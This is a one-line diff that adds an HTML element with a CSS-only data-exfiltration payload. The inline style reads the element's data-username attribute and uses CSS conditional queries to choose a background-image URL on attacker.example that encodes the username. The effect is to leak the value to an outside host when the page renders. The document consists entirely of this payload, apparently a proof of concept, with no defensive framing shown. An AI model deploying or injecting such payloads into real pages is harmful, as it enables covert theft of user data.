@@ -1,0 +1,1 @@
+<div id="profile" data-username="james" style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.example/martin); else: if(style(--val:"james"): url(https://attacker.example/james); else: url(https://attacker.example/other))); background-image: image-set(var(--steal));'></div>
